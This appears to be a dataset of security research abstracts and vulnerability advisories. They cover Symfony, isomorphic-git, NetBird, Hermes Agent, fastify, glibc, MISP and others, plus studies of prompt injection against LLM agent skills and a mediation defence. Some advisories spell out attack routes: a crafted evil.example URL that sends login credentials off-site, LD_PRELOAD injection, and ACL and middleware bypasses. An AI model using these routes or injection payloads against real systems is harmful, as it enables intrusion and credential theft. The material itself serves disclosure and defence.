items.summary: We present $\mathsf{LaTSEC}$, a three-round lattice-based threshold signature scheme with native non-interactive identifiable abort. Each party holds one small-norm signing share and is associated with one public abort key, against which its partial signature is verified directly, without zero-knowledge proofs or an additional interactive protocol. Prior lattice-based threshold signatures that identify misbehaving parties rely on one of three mechanisms: zero-knowledge proofs, an additional interactive protocol, or an everywhere-short secret sharing scheme in which each party holds multiple signing shares, each with its own public abort key. Compared with schemes that use the third mechanism, $\mathsf{LaTSEC}$ substantially reduces per-party storage. The construction uses $\mathsf{SEC}$, a recent ramp everywhere-short secret sharing scheme based on lossless expanders that gives each party a single short share. We prove correctness, identifiable-abort security, and threshold unforgeability under the standard $\mathsf{MLWE}$ and $\mathsf{MSIS}$ assumptions. The unforgeability proof introduces the Repeated-$\boldsymbol{A}$ Matrix Hint-MLWE problem, a new variant of $\mathsf{MLWE}$ with hints that captures the complete tuple of correlated public abort keys. We rigorously prove that this new variant admits a reduction from the standard $\mathsf{MLWE}$ problem. For 60 parties at 128-bit security, $\mathsf{LaTSEC}$ tolerates up to 6 corrupted parties, and, empirically, a randomly chosen set of at least 46 parties can sign with probability at least 0.99. Each party holds one signing share of about 14.3 KiB and is associated with one 24-KiB public abort key.
items.title: LaTSEC: Lattice-Based Threshold Signatures with Native Non-Interactive Identifiable Abort and Compact Per-Party Storage

items.summary: Generative voice cloning threatens voice-based authentication, yet current deepfake detectors rely on power-hungry, high-precision models unsuited to edge hardware. We present SWIFT (Streaming Whiten-Integer Forensic Trust-Engine), a handcrafted detector that works in the high-frequency noise domain where synthesis artifacts concentrate. A first-order integer high-pass residual drives nine families of fixed-point descriptors, among them integer lifting-wavelet cepstral quantiles, Mahalanobis anomaly distances, Poincaré phase-space geometry, and phase jitter, fused by calibrated gradient-boosted trees and a sparse L1-regularised meta-learner. Under leakage-controlled nested cross-validation, with one shared preprocessing chain for real and fake audio, this reference model reaches accuracy of up to 99.86% and an Equal Error Rate (EER) as low as 0.03% across eight benchmarks. Its integer front-end and a fixed-point linear classifier run on the programmable logic of a PYNQ-Z2 (Zynq-7020) board, with a 7.85 microseconds per-frame datapath latency (127.4k frames/s) at 1.734 W and 11.2% LUT utilisation. Integer-only audio deepfake feature extraction is thus feasible at the edge without pretrained neural models or floating-point units.
items.title: SWIFT: A Handcrafted, Arithmetic-Minimal FPGA Engine for Real-Time Audio Deepfake Detection

items.summary: In rateless transmission the transmitter keeps sending until the legitimate receiver (Bob) can decode. Over a wiretap channel this has a useful side effect: the eavesdropper (Eve) sees only as many symbols as Bob needs, although the transmitter knows neither channel. We study the secrecy of rateless lattice codes in this setting. First, using a public dither and privacy amplification, we prove a finite-length secrecy bound, in total variation distance, for every channel realization, even if Eve knows all codes and seeds and combines all packets. Second, stopping when Bob acknowledges successful decoding, as in hybrid ARQ, costs at most the logarithm of the number of possible feedback outcomes in secret bits. Third, for degraded sessions with state-based stopping and without a pre-shared key or other public discussion, the secret-key rate of a session cannot exceed its accumulated Gaussian secrecy capacity, and adaptive key generation with shaped rateless lattice codes comes within any $ε>0$ of this limit when Eve's channel states are revealed after the session. If only their statistics are known, choosing the key length after the session guarantees a prescribed secrecy-outage probability. Finally, over block Rayleigh fading with a CRC-based acknowledgement and joint belief-propagation decoding, and with Eve $20$~dB weaker on average, the scheme reaches $59$--$69\%$ of the outage-weighted throughput of an ideal infinite-length secure hybrid-ARQ benchmark for Bob SNRs of $8$--$20$~dB.
items.title: Rateless Lattice Codes over Fading Wiretap Channels: Finite-Length Secrecy and the Secret-Key Capacity of Degraded Sessions

items.summary: Consensus lets distributed participants agree on a common state, but it makes monetary validity depend on network connectivity and collective acceptance. We explore making validity intrinsic to a digital coin. We propose an \emph{Intrinsic Value Module (IVM)}: trusted hardware that gives a coin locally verifiable authenticity and spendability, analogous to verifying a signature. Under stated hardware and cryptographic assumptions, the IVM abstraction and our offline transfer protocol move monetary uniqueness from a replicated ledger into non-clonable protected state. The protocol prevents forgery, replay, double credit, and double spending by genuine, uncompromised IVMs; communication failures may lock value but cannot duplicate it. We distinguish local transfer atomicity and asset uniqueness, which the protocol establishes, from global state consistency across disconnected devices, which it does not. The IVM does not eliminate trust; it relocates trust to certified hardware, issuer roots, and non-rollback state. We present the architecture, protocol, and security analysis, and discuss open challenges.
items.title: Intrinsic Value Modules: Trusted-Hardware Support for Locally Final Offline Asset Transfer

items.summary: Developing deep learning models requires substantial computational and data resources, making them core intellectual assets for enterprises. As Deep Learning as a Service (DLaaS) increasingly extends to edge computing environments, models deployed on third-party devices face growing threats from reverse engineering. Existing model protection methods often depend on specialized hardware or incur substantial computational overhead, while lacking effective mechanisms for controlling model usage. There is therefore a need for lightweight solutions that combine model protection with controllable authorization. To address this challenge, we propose KeyObf, a model obfuscation and controllable authorization scheme for DLaaS. KeyObf efficiently protects model parameters and architecture through model obfuscation while binding parameter recovery to user keys, ensuring that only authorized users can perform inference correctly. By integrating a key-based mechanism into the obfuscation framework, KeyObf unifies model protection and controllable authorization. Experimental results demonstrate that KeyObf preserves the inference accuracy of authorized users, rejects inference requests when credential authentication fails, and increases the difficulty of recovering model information under the evaluated reverse-engineering conditions. These results demonstrate the feasibility of a lightweight approach to model protection and controllable authorization in third-party deployment scenarios.
items.title: A Model Obfuscation and Controllable Authorization Scheme for Deep Learning as a Service

items.summary: This paper investigates the cyber-economic impact and pre-clearing detectability of false data injection attacks (FDIAs) in peer-to-peer (P2P) energy trading among interconnected microgrids. In the proposed cyber-economic framework, load and photovoltaic profiles drive a sequential 15-minute market with deterministic double-sided proportional (pro-rata) allocation and supply-to-demand-ratio (SDR) pricing, while true physical injections are separated from communicated market quantities. The framework is evaluated through a multi-microgrid case study over 69,904 market-aligned states, for which all AC power-flow solutions converged and voltages remained within 0.98999-1.04369 per unit. Healthy local exchange reached 1,159.66 MWh and generated USD 92,772.62 of community benefit. Bias, scaling, and ramp attacks modify only one microgrid's communicated quantity, altering the settlement price, P2P allocation, scheduled residual-grid exchange, participant financial outcomes, and benefit fairness, while true feeder injections remain unchanged. Role-specific random forest, statistical threshold, and score-fusion detectors are compared using only information available before clearing. Pooled sample-level detection rates range from 7.82% to 12.14%, with false-alarm rates from 4.69% to 7.70% and role dependence. In the investigated case study, measurable downstream economic distortion and low pre-clearing detectability coexist under bounded quantity manipulation.
items.title: Quantity-Level FDIA in SDR-Based P2P Energy Trading: Cyber-Economic Impact and Pre-Clearing Detection

items.summary:
When Request::getBaseUrl() does not find the script name at the start of the request URI, it looks for it further into the path. This supports web servers that rewrite every URL to a front controller in a subdirectory. The base URL then kept everything before the script name, and the client chooses that part. A request URI starting with // or /\ made the base URL start with a host.

With SCRIPT_NAME=/public/index.php, a request for //evil.example/public/index.php/login is routed to /login, with the base URL //evil.example/public/index.php and the base path //evil.example/public. The URLs generated for that page then point to evil.example:
- links built with path() and the actions of forms, so a login form sends the credentials of the user to evil.example;
- redirects to generated URLs, such as the ones of redirectToRoute();
- assets referenced with a relative path through asset(), so the page can load scripts from evil.example.

The attacker has to make a user follow a crafted link, such as https://app.example//evil.example/public/index.php/login. framework.trusted_hosts does not help, since the host of the request is the real one.

Applications are affected when their front controller is in a subdirectory and the web server sends it URIs that do not start with that directory. A .htaccess file at the root of the project that rewrites every URL to public/ does that, for instance.

Applications are also affected when the web server sets SCRIPT_NAME to the path of the request. Some nginx configurations do that when they send every request to the front controller without fastcgi_split_path_info. php -S does it too, with a router script outside the document root. A request for /\evil.example/index.php then gets the base URL /\evil.example/index.php, which browsers read as a link to evil.example.

The configurations recommended in the Symfony documentation are not affected.

Request::getBaseUrl() now returns an empty base URL when the request URI starts with // or /\.

Since the fix for CVE-2025-64500, Request::getPathInfo() strips the script name from the start of the URL. It does so even when the script name is only the start of a longer path segment. With SCRIPT_NAME set to /index.php, a request to /index.phpadmin gets the path info /admin and is routed like /admin. Encoded spellings such as /index%2Ephpadmin or /%69ndex.phpadmin work too. Before that fix, the path info was admin, which no route matched.

Rules enforced by Symfony are not affected: access_control and firewalls read the same path info as the router. Rules enforced in front of PHP are. The nginx configuration of the Symfony documentation and the .htaccess file of symfony/apache-pack make /index.php/admin unreachable, but they pass /index.phpadmin to the front controller. So a location /admin block in nginx, a <Location /admin> section in Apache, or a CDN or WAF rule on /admin can be bypassed.

The script name is now stripped only when it is followed by /, ? or the end of the URL. A request to /index.phpadmin gets the path info /index.phpadmin.

items.summary:
### Summary
When applying a delta object from a packfile, isomorphic-git reads a **server-controlled** `targetSize` and calls `Buffer.alloc(targetSize)` with no upper bound. A single malicious HTTP response to `git.clone()`/`git.fetch()` can force a ~2 GB allocation → memory exhaustion / DoS (process killed on memory-constrained hosts).

### Details
`src/utils/applyDelta.js`:

```js
const sourceSize = readVarIntLE(reader)
const targetSize = readVarIntLE(reader)   // attacker-controlled
…
target = Buffer.alloc(targetSize)
```

A pack with one `OBJ_REF_DELTA` whose header declares `targetSize = 0x7FFFFFFF` (~2 GB) and a 1-byte op causes the full allocation up front. The subsequent size-mismatch error is swallowed in `GitPackIndex.fromPack`, so on a host with spare RAM it silently wastes ~2 GB; on a small host the OS `SIGKILL`s the process.

#### Canonical git behavior (divergence)
git rejects the same 78-byte pack in ~96 ms — `error: delta replay has gone wild` / `fatal: … failed to apply delta` — with no large allocation and no hang (it bounds delta replay against the declared size rather than trusting it).

### PoC
`https://github.com/spiceoverflow/av4-oom` — open in a Codespace; a single clone/fetch against the bundled server, run under `--max-old-space-size=256`:

```
[AV-4] *** OOM ALLOCATION CONFIRMED — Buffer.alloc(targetSize) RAN ***
[AV-4] External (Buffer) memory rose by 2048 MB during clone.
```

(The allocation is off-heap, so a Node heap cap does not mitigate it.)

### Impact
A denial of service via unbounded memory allocation: a single response from a malicious or MitM'd server to `git.clone()`/`git.fetch()` forces a multi-gigabyte allocation, crashing the process on memory-constrained hosts.

Any application or service that clones or fetches from untrusted/compromised remotes with isomorphic-git — most acutely containers, serverless functions, and small VMs, where the OS OOM-kills the process.

### Suggested fix
Don't pre-allocate the untrusted `targetSize`: build the result from the actual delta ops and validate the total against `targetSize` before concatenating (and/or cap it against the advertised pack size).

items.summary:
## Summary

`Point#mul` — the default, constant-time scalar multiplication and the library's headline secret-scalar operation — could leak timing information about the secret scalar (a private key or ECDSA-style nonce in a downstream consumer) **not because of a source-level bug, but because the compiler reconstructed a branch from branchless source.**

The Montgomery ladder selects between point candidates with `uint256_select`, written deliberately branchlessly as `r = (a & ~mask) | (b & mask)` with a mask that is all-ones or all-zeros. GCC 15.2 at `-O2` recognises this select idiom, reconstructs the original boolean condition, and emits a secret-dependent conditional jump (`je`/`jne`). The branch's taken/not-taken timing correlates with the secret scalar bits flowing through the ladder.

This silently undid the 0.17.0 fix for the historical |t|=875 infinity-branch leak, which had relied on `uint256_select` compiling to branchless code.

## Impact

A timing side-channel on the secret scalar in constant-time scalar multiplication. For a consumer that calls `Point#mul` (or the native `scalar_multiply_ct`) on a secret key or nonce and exposes timing to an attacker (e.g. an online signing oracle), repeated measurements can statistically recover scalar bits — the classic ECC private-key/nonce timing-attack setting (cf. Brumley–Boneh). The leak is in the *compiled binary*; the source is correct, so source review and the deterministic ctgrind check on a *non-reconstructing* toolchain do not reveal it.

Pre-1.0 with no published RubyGems dependents, so this is handled as fix-publish-and-document: full GHSA + CVE record without a coordinated downstream-notification timeline. The CVE is filed for citability so the empirical record (paper → review → compiler regression → fix) is permanent and searchable.

## Affected configurations

The defect is a property of the (source, compiler, flags) triple, not the source alone:

- **Source:** any pre-`0.18.0` build. The branchless `uint256_select` was introduced with the 0.17.0 `jp_add_internal` |t|=875 fix; the pre-0.17 versions on RubyGems (0.15, 0.16) had different CT issues which the 0.17.0 fix addressed, so the safest user guidance is "upgrade to 0.18.0 from any earlier version".
- **Compiler:** one that reconstructs the all-0s/all-1s select into a branch. Confirmed: **GCC 15.2.0, `-O2`**. The extension ships with `-O2` (`extconf.rb` appends it), so the shipped binary on this compiler is affected.
- **Not affected:** the pure-Ruby path (different code; separately not claimed constant-time), and toolchains that emit `cmov` or pure bitwise ops here (the original review's toolchain).

## Patch (v0.18.0)

Introduces a value barrier (libsecp256k1/BoringSSL pattern) and routes every constant-time select mask through it:

```c
static inline uint64_t ct_value_barrier_u64(uint64_t x) {
#if defined(__GNUC__) || defined(__clang__)
    __asm__ volatile("" : "+r"(x));
#endif
    return x;
}

static inline uint64_t ct_mask_u64(uint64_t flag) {
    return ct_value_barrier_u64(-(uint64_t)(flag != 0));
}
```

Applied to all nine mask-select sites: `uint256_select`; `fred`, `fadd`, `fsub`, `fneg`; `scalar_reduce`, `scalar_add`; the `jp_double` infinity select; and the ladder `cswap`. Only `uint256_select` actively branchified under GCC 15.2/`-O2`; the rest are hardened as defence-in-depth.

## Workarounds (for unpatched users)

- **Upgrade to v0.18.0** (recommended).
- Or: compile the extension at `-O0`/`-O1`, or with a compiler that does not reconstruct the select (verify with `objdump -dl`) — fragile, not recommended.
- Do not call `Point#mul` on secret scalars from a timing-observable context until patched.

## Verification (reproducible)

Reference machine: AMD Ryzen 9 9950X (Zen 5), microcode `0xb404023`, Ubuntu 26.04 / Linux 7.0.0-14, GCC 15.2.0; `systemd-detect-virt = none`; turbo off, `performance` governor (min=max), SMT off, harness pinned with `taskset -c <core>` under `chrt -f`.

#[AsLiveComponent(route: '...')] makes a live component send its requests to another route. The documentation suggests it so that the component lives under a specific firewall, for example. The default /_components/{_live_component}/{_live_action} route still served the component, though. A request to it rendered the component and ran its actions outside the firewall and the access rules of the configured route.

The request needs props signed by the application, which a page that rendered the component provides. Controller attributes on the component, like #[IsGranted], still applied.

A live component is now only served by the route it is configured with.

items.summary: A protection mechanism failure in the userspace firewall of the NetBird client (client/firewall/uspfilter) in NetBird versions 0.55.0 through 0.74.6 allows an attacker who controls an enrolled peer to bypass the access control rules of another peer by sending IP-fragmented packets. The packet filter returned an allow verdict for any IPv4 fragment, and for any IPv6 packet carrying a Fragment extension header, before evaluating the ACL rules. This applied to the leading fragment as well as to continuation fragments, so no part of a fragmented datagram was filtered and ports denied by policy could be reached. The userspace filter is the packet filter wherever the client does not program the kernel firewall, which includes the Android and iOS apps. The issue is fixed in version 0.74.7, in the Android app from version 0.6.0 and in the iOS app from version 0.3.3, which evaluate fragments against the same ACL rules as unfragmented packets.

items.summary: Hermes Agent is an open-source autonomous AI agent built by Nous Research for running tool-using workflows across CLI, desktop, and messaging interfaces. From 0.21.6 to 0.23.1, when Bot Desktop is hosted inside a non-local terminal backend, the agent process reads a backend-writable screen environment file without validating keys or values and merges its entries into the environment of processes started on the agent machine. Specifically, when terminal.backend is set to docker or ssh (or a plugin backend declaring supports_streams) with placement auto or terminal, _published() in tools/bot_desktop/sandbox_host.py accepts arbitrary KEY=VALUE lines from the hermes-bot-desktop env file and propagates them via tools/bot_desktop/runtime.py into the browser harness, computer-use helpers, and local terminal children. Code running inside the terminal backend can therefore set variables such as LD_PRELOAD, DYLD_INSERT_LIBRARIES, or PATH and gain code execution on the agent machine as the gateway user upon a subsequent browser or computer-use spawn, exposing credentials, tokens, and session history under the Hermes home directory. The default local backend, backends that cannot host a screen (Modal, Daytona, and Vercel), and Hermes Cloud in its default configuration are not affected. This issue is fixed in version 0.23.2.

items.summary: @fastify/express is a compatibility layer that lets Express middleware run inside the Fastify web framework. In versions 4.0.0 through 4.0.9, when Fastify routing is configured to be case-insensitive, the router folds the request path to lower case in a way that maps certain non-ASCII Unicode characters to ASCII letters, but @fastify/express matches Express mount paths against the decoded path without applying the same folding. The two disagree, so a request that spells a letter of a mount path with an equivalent Unicode character is routed to the protected handler while the path-scoped middleware mounted on that path never matches and is skipped. An unauthenticated client can therefore reach a handler that an authentication, authorization, or rate-limiting middleware was meant to protect, though only when the application enables case-insensitive routing and the mount path contains an affected letter. The issue is fixed in @fastify/express 4.0.10, and users should upgrade to 4.0.10 or later.

items.summary:
The OpenThread PSA crypto platform backend in modules/openthread/platform/crypto_psa.c only supported PSA key references. otPlatCryptoAesSetKey() copied aKey->mKeyRef into the AES context unconditionally. On an OpenThread Radio Co-Processor (RCP) build, CONFIG_OPENTHREAD_CRYPTO_PSA does not select CONFIG_OPENTHREAD_PLATFORM_KEY_REF, so OpenThread passes the MAC key as literal bytes and mKeyRef is uninitialized. psa_cipher_encrypt() in otPlatCryptoAesEncrypt() then fails without writing its output, and the error is only caught by an OpenThread assertion that is compiled to a no-op when CONFIG_ASSERT is disabled.

When the RCP handles transmit security in software, AES-CCM* is never keyed. That is the case with Thread 1.2 or later, where CONFIG_OPENTHREAD_MAC_SOFTWARE_TX_SECURITY_ENABLE defaults to y, on a radio driver without IEEE802154_HW_TX_SEC. Every MAC key-id-mode-1 frame goes out with its payload XORed against a single 16-byte pad of stale stack data, reused for every block, and with an unkeyed MIC. CONFIG_OPENTHREAD_CRYPTO_PSA is enabled by default since v4.4.0.

A passive attacker within 802.15.4 radio range can recover the pad from predictable plaintext (for example 6LoWPAN headers) and read the payload of the frames the device transmits. The practical impact is limited. The configuration is not the default (the default Thread version is 1.1), and the same defect makes peers reject every secured data frame, so an affected device cannot exchange data on the network. Received traffic and key distribution are not affected. With CONFIG_ASSERT enabled, the RCP halts on the first secured transmission instead.

items.summary:
The glob functions in the GNU C Library versions 2.44 and earlier may free the same heap block twice when a memory allocation fails while glob prepends the directory name to the names it matched.  The names already rewritten are freed, but their pointers stay in the result vector, and the error path frees them again with globfree.

The allocation must fail after at least one name has been rewritten, so the issue can only be reached when the process is already close to its memory limit, for example under an address space limit (RLIMIT_AS) or on a 32-bit system.  The attacker needs control to make the result large enough to make the program or service run out of memory, either by controlling the glob pattern and having knowledge of the filesystem layout or through other means.  This issue affects all architectures and ABIs supported by the GNU C Library.

MISP's LinOTPAuth plugin, used for one-time-password authentication against a LinOTP server, did not enforce TLS server certificate verification when the LinOTPAuth.verifyssl configuration option was not explicitly set. In a default or minimally configured deployment, the authentication request to the LinOTP server was sent without peer or peer-name certificate validation, effectively allowing self-signed or spoofed certificates.

An attacker with a network position between the MISP instance and the LinOTP server could perform a man-in-the-middle attack to intercept or tamper with the authentication exchange, potentially capturing one-time passwords or user credentials.

Preconditions:
- The LinOTPAuth plugin is enabled and configured to communicate with a LinOTP server
- The LinOTPAuth.verifyssl setting is absent or null (not explicitly set to true or false)
- The attacker can position themselves on the network path between MISP and the LinOTP server

Security impact:
- Confidentiality of OTP tokens and authentication credentials in transit
- Potential for credential interception or replay

Affected versions: MISP prior to 2.5.52

items.summary:
MISP contains an authorization bypass in its tag attachment functionality. The endpoints responsible for editing event tags, editing attribute tags, and adding tags to event reports accepted arbitrary tag IDs without verifying whether the authenticated user was permitted to attach the referenced tag.

The events/addTag endpoint already resolved tag IDs through a restricted lookup that enforced per-user and per-organisation tag visibility rules. However, the three tag-editor endpoints (editEventTags, editAttributeTags, and eventReports/addTag) passed the supplied tag IDs directly to the attachment logic without any such check.

Preconditions:
- An authenticated user with tagger and add permissions on the target event/attribute/report.
- Knowledge or discovery of a tag ID that is restricted (local_only) to another organisation.

Impact:
- A user can attach a tag that is restricted to a different organisation, effectively bypassing the tag visibility and scoping model.
- A local_only tag can be attached as a global tag, violating the intended distribution restriction and potentially exposing the existence or semantics of another organisation's restricted tag to a broader audience.
- Data integrity of the MISP instance is compromised as the tag association model no longer reflects the intended access-control boundaries.

Affected versions: MISP prior to 2.5.52.

items.summary: @fastify/middie is the middleware engine that adds Express and Connect style middleware support to Fastify. In versions up to and including 9.3.6, middie builds the match regular expression for each path-scoped middleware from its mount path without collapsing duplicate slashes, even when the application enables the ignoreDuplicateSlashes router option. Under that option Fastify's router collapses duplicate slashes in both the registered route and the request path, so a mount path containing a doubled slash is served by the router at its single-slash form while the middleware's compiled match still requires the doubled slash and never matches. A path-scoped middleware such as authentication, authorization, or rate limiting is therefore skipped while the router dispatches the request to the protected handler, without any authentication required. Applications are affected when they enable ignoreDuplicateSlashes and a middleware mount path reaches middie with a duplicate slash, most commonly when a plugin prefix that ends with a slash is joined to a mount path that starts with one. The issue is fixed in @fastify/middie 9.3.7, and users should upgrade to 9.3.7 or later. As a workaround, enforce authorization in a Fastify hook such as preHandler that runs after routing, and avoid mount paths and plugin prefixes that introduce duplicate slashes.

items.summary:
Authorization Bypass Through User-Controlled Key vulnerability in elixir-grpc grpc_server and grpc allows an attacker to make a handler act on a resource other than the one named in the URL of an HTTP-transcoded route, via a request with a gRPC Content-Type.

Only the transcoding clause of GRPC.Server.do_handle_request/4 (grpc_server/lib/grpc/server.ex, and lib/grpc/server.ex before the package split) applies the route's path bindings to the request message. The Cowboy handler picks that clause from the request Content-Type, not from the route. A request to a transcoded URL with application/grpc or application/grpc-web is decoded from the body alone, so every path-bound field takes its value from the body. A gateway, proxy rule or WAF that authorizes on the URL path sees one resource while the handler receives another.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

Bluetooth: L2CAP: Only accept connection responses to outstanding requests

An outgoing channel waits in BT_CONNECT until security
and the feature mask exchange complete, and only then
sends its connection request. A peer can answer it
before that with a connection response matching our
source CID. The channel then moves to BT_CONFIG,
completes configuration and becomes connected before
security has completed. If security then fails,
l2cap_security_cfm() leaves the connected channel
alone, so it stays up on a link that did not reach
the required security level.

A connection response with a zero source CID is
matched by identifier. Another channel can hold the
same identifier for a response it still has to send,
so the lookup can pick the wrong channel.

Only accept a connection response while our request
is outstanding, and only look at such channels when
matching by identifier.

items.summary: Software dependencies execute within the trust boundary of downstream applications, yet provenance, static analysis, and package-level behavioral approaches do not directly determine how a released artifact behaves for a specific program. We present Preflight, a program-scoped pre-execution verifier for Python dependencies that extracts application-referenced symbols, iteratively synthesizes and validates function-level harnesses, executes resolved artifacts in a restricted environment, records behavioral fingerprints, and compares target behavior against prior versions when suitable baselines exist. We evaluate Preflight on four real software-supply-chain incidents under five application contexts, a 100-package benign corpus, and a controlled function-level versus import-only ablation. Preflight returns malicious verdicts in four incident contexts and a clean verdict in the LiteLLM client context, where the affected proxy-server path is not exercised. All 100 evaluated benign packages receive clean verdicts, with zero observed false positives. In a controlled ablation on Ultralytics and ctx, function-level harnesses expose malicious behavior in both incidents, whereas import-only probing exposes neither. Together, these results show that conditioning behavioral verification on the downstream program can expose security-relevant dependency behavior while remaining selective on benign workloads.
items.title: Preflight: Agentic Last-Mile Verification for AI Software Supply Chains

items.summary: Agent skills are reusable packages that extend a large language model (LLM) agent with scripts, third-party dependencies, and natural-language instructions. An agent builds a skill's arguments from user requests and untrusted external content, so a flaw left by a benign author can escalate a prompt injection to code execution. Existing studies target malicious skills or a single attack vector, and none tests whether an agent can reach such flaws. We present the first registry-scale empirical study of the supply chain attack surface arising from unintentional vulnerabilities in agent skills, over all 48,682 skills in ClawHub. The study covers two carried-over risks, dependencies and first-party code, and two agent-native ones, install instructions and credentials printed to stdout. We screen all skills by static analysis, manually review all 3,428 cases flagged by the four main detectors, and test reachability by running sampled flagged skills in a sandbox and with a live LLM agent under indirect prompt injection. First, dependency risk carries over in a different form: 49.6% of the skills with resolvable dependencies depend on a version with a known CVE, and unlike npm packages, which mostly become vulnerable after release, 78.3% of them are born vulnerable, already exposed at publication. Second, few of these CVEs are reachable: agent input reaches the vulnerable function in only 3.0% of the affected skills, whereas 21 of 22 sampled first-party flaws are exploited end to end in the sandbox. Third, a live agent executes the injected payload in 48.5% of the sampled flagged skills, but almost always in its own shell before the skill runs, and the payload reaches a flaw in the skill itself in only 5.0%. Hence, registries should prioritize first-party flaws over dependency alerts, and agent runtimes should not pass skill arguments through a shell.
items.title: Carried-Over and Agent-Native Threats in the Supply Chain of LLM Agent Skills

Argument-level provenance blocks such values when they come from untrusted content, but accepts a trusted value that the user never requested. IntentFlow, a mediation layer between an unmodified planner and its tools, checks each authority-bearing argument against an intent contract and a provenance policy. On a synthetic benchmark of 200 attacks (oracle intent and injection labels, declared roles), attack success falls from 50.5% with provenance alone to 12.0% [8.2-17.2%]; every remaining success alters a content or payload field. IntentFlow wrongly blocks none of 200 paired benign tasks and 4 of 50 hard ones. On 50 trusted-but-unauthorized attacks, provenance-only mediation executes all 50 and IntentFlow none; a CaMeL-style check also blocks all 50 but rejects 16 of 50 benign tasks. On an offline AgentDojo-derived replay, IntentFlow blocks all 20 attacks at 75% benign success, as does a CaMeL-style check; a Progent-style allowlist blocks 19 and keeps all benign tasks. With one live planner and the same oracles, the mediator blocked all 17 corrupted calls proposed in 110 attacks.

items.summary: Given the ever-increasing dependency on interconnected digital systems, cybersecurity has become a major concern. To protect markets and societies, governmental entities are developing legislation to enhance cyber resilience across sectors, introducing new technical and legal requirements. The NIS2 Directive, a revised version of the European-wide cybersecurity legislation, entered into force on 16 January 2023. Member States were required to adopt and publish transposing measures by 17 October 2024 and apply them from 18 October 2024. Specific obligations for essential and important entities are set out in national legislation. At the same time, other organizations, while not legally bound, seek to improve their cybersecurity maturity in alignment with EU-wide advances, for which NIS2 serves as a key reference. This paper presents the work conducted within a large European enterprise to align itself with the NIS2 Directive, focusing on how organizations can analyze and interpret its provisions to drive concrete technical and organizational improvements. A systematic methodology is applied to frame the company within the NIS2 context, identify relevant requirements, and derive actionable measures. Beyond outlining the technical steps taken, the work highlights the challenges of translating legislative requirements into practical implementations, emphasizing the use of existing IT resources while accounting for key legal aspects. The paper concludes with a discussion and reusable artifacts addressing critical areas such as Supply Chains and Third Parties and Zero-Trust Principles, illustrating how legislative instruments such as NIS2 can be translated into practical mechanisms to strengthen cybersecurity strategies.
